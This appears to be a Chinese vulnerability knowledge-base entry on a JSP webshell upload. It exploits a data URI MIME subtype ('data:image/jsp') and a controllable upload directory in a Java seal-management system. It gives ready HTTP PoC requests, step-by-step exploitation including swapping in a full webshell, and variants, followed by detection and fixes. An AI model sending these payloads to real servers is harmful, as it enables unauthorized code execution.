---
id: web-generic-file-upload-base64-data-uri-extension-jsp
title: Base64 data URI 上传按 MIME 生成后缀：data:image/jsp 落盘 JSP WebShell
type: scenario
domain: web
path: web/generic/file-upload
technique: base64-data-uri-extension-jsp-upload
tags:
- web
- file-upload
- base64
- data-uri
- jsp
- webshell
- rce
- java
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T02:26:38+08:00'
  notes: 已对照原文与图09-18核对：uploadLogo 取 img_data 调 Base64StrToImage.base64MutipartFile，扩展名取自解码后 originalFilename 末段且无白名单，落盘 datas/upload/unit_logo 并回显路径；实测 data:image/jsp 得到 .jsp 且访问输出 123；uploadFile.htm 的 moudleDir 可控、checkNoBlackType/checkWhiteType 返回值未被使用，1.jsp 上传成功并执行。未验证点：未在本机复现；依赖登录态。
url: /docs/web/generic/file-upload/web-generic-file-upload-base64-data-uri-extension-jsp/
draft: false
kb_aliases:
- data:image/jsp 上传
- Base64 图片上传 getshell
- base64MutipartFile
- 上传后缀取自 data URI
- 公章系统上传
- img_data 上传
---

## 一句话结论

上传接口接收 `img_data` 形式的 Base64 图片字符串，服务端用 `Base64StrToImage.base64MutipartFile` 解码后，从 `data:<mime>;base64,...` 的 MIME 子类型推导文件扩展名并直接写入 Web 目录；把前缀改成 `data:image/jsp;base64,<JSP 代码>` 即可落盘 `.jsp`，访问返回的完整路径即执行 WebShell。

## 原理

- 前端常把图片以 `data:image/png;base64,iVBOR...` 形式提交，后端需要把这段字符串还原成 `MultipartFile` 再走统一上传逻辑。还原时通常会解析 data URI 的 `image/<subtype>`，并将 `<subtype>` 当作扩展名（或从原文件名取后缀）。
- `uploadLogo` 只判断 `img_data` 非空，把空格替换成 `+` 后交给 `unitInfoService.uploadLogo`；后者调用 `Base64StrToImage.base64MutipartFile(img_data)`，得到一个带 originalFilename 的 `MultipartFile`。
- 上传逻辑取 `myFileName.lastIndexOf(".") + 1` 作为扩展名、`toLowerCase()` 后直接拼到 UUID 文件名上，没有白名单、没有魔数/内容校验，也没有检查 MIME 与实际内容是否一致。整个文件内容按 Base64 解码后的原始字节写盘。
- 保存目录为 `datas/upload/unit_logo/<unit_id>/<yyyy>/<yyyy-MM>/<yyyy-MM-dd>/`，位于 Web 根目录下；方法把完整 `filePath` 返回给调用方。UUID 文件名不影响利用，因为路径直接由响应给出。
- 因此 `data:image/jsp;base64,PCUgcGFnZSA...` 会被解析为扩展名 `jsp`，落盘为 `<uuid>.jsp`；Web 容器把该目录当静态资源/脚本目录访问，JSP 被编译执行。

## 触发条件

- 存在接受 Base64 data URI 的上传接口（本例 `/seal/unitInfo/uploadLogo.htm`，参数 `img_data`）。
- 上传逻辑根据 data URI 的 MIME 子类型或原始文件名决定扩展名，且无扩展名白名单/内容校验。
- 落点位于 Web 根目录或 Web 容器可解析脚本的目录，且上传目录可通过 URL 访问。
- 攻击者持有可登录的会话（本例要求 session 中存在 `YX_USER_OBJ`；可配合未授权建号链获得）。
- Web 容器支持 JSP 解析（Tomcat/WebLogic 等）。

## 利用步骤

1. 登录获得会话（若无可先利用未授权建号接口创建账号）。
2. 构造 `img_data`：`data:image/jsp;base64,` + Base64(`<%@ page import="java.io.File" %><% out.println("123"); %>`)。
3. 以 `multipart/form-data` 向 `/seal/unitInfo/uploadLogo.htm` 提交 `img_data`，携带会话 Cookie。
4. 从响应体读取返回的完整路径（形如 `/datas/upload/unit_logo/<unitId>/2025/2025-06/2025-06-15/<uuid>.jsp`）。
5. 浏览器/curl 访问该路径，确认 JSP 执行；替换为功能完整的 WebShell。
6. 变体：`/web/fileUpload/uploadFile.htm?moudleDir=/data/upload/` 接受普通 multipart 文件，`moudleDir` 可控上传目录，文件名为随机 UUID + 原后缀；本例中 `1.jsp` 仍上传成功并执行，说明其 `checkNoBlackType`/`checkWhiteType` 校验未生效或不完整。

## PoC

```http
POST /seal/unitInfo/uploadLogo.htm HTTP/1.1
Host: target:8088
Cookie: sid=<会话>; ZHANGIN_MOBILE=
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4gYsYC50Q9rIWrks

------WebKitFormBoundary4gYsYC50Q9rIWrks
Content-Disposition: form-data; name="img_data"

data:image/jsp;base64,PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmlvLkZpbGUiICU+PCUgb3V0LnByaW50bG4oIjEyMyIpOyAlPg==
------WebKitFormBoundary4gYsYC50Q9rIWrks--
```

```text
# 预期响应（text/html）
/datas/upload/unit_logo/<unitId>/2025/2025-06/2025-06-15/<uuid>.jsp

# 访问该路径，页面输出 123，证明 JSP 已执行
```

```http
# 变体：可控上传目录 + 普通 multipart JSP
POST /web/fileUpload/uploadFile.htm?moudleDir=/data/upload/ HTTP/1.1
Host: target:8088
Cookie: sid=<会话>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4gYsYC50Q9rIWrks

------WebKitFormBoundary4gYsYC50Q9rIWrks
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: application/octet-stream

<%@ page import="java.io.File" %><% out.println("123"); %>
------WebKitFormBoundary4gYsYC50Q9rIWrks--
```

```text
# 返回 {"status":"1","msg":"上传成功","data":"<文件记录 id>"}
# 落盘路径为 moudleDir + yyyy/yyyy-MM/yyyy-MM-dd/<uuid>.jsp
```

## 变体与关联

- 变体：`data:image/php`、`data:image/phtml`、`data:image/aspx`，随目标解析语言替换 MIME 子类型。
- 变体：MIME 子类型不被信任时，可在 Base64 解码后的“原文件名”里带 `.jsp`，或利用双后缀/大小写/尾随点绕过。
- 变体：`moudleDir` 完全可控时，可把文件写到 Web 根、其他租户目录或任意绝对路径（路径拼接而非规范化校验）。
- 关联：[[web-generic-file-upload-extension-zero-check]]（扩展名零校验的通用版）、[[web-generic-file-upload-content-type-trust-bypass]]（信任客户端 MIME 的同类问题）、[[web-generic-file-upload-weak-suffix-bypass]]、[[web-generic-auth-hardcoded-bip-cred-orgid-user-create]]（本链的前置登录/建号）。
- 边界：上传目录未映射到 Web、容器禁止该目录执行脚本、扩展名白名单严格、服务端重新编码图片/剥离非图片内容、UUID 文件名无法获取且无路径回显时，利用受阻。

## 检测与防御

- 检测：请求中出现 `data:image/jsp`、`data:image/php` 等非图片 MIME；上传响应返回 `.jsp/.php/.aspx` 路径；上传目录中新增脚本文件；对上传目录的脚本访问与 JSP 编译事件。
- 修复：按白名单校验真实图片类型（解码后检查魔数/重新编码）；扩展名由服务端固定映射，禁止从 data URI MIME 或原文件名取；上传目录移出 Web 根并禁止脚本执行。
- 加固：上传文件重命名为无扩展名 + 内容哈希，下载走鉴权代理；限制 `moudleDir` 为预定义枚举并做路径规范化；对上传目录做只读挂载与 WAF 规则。
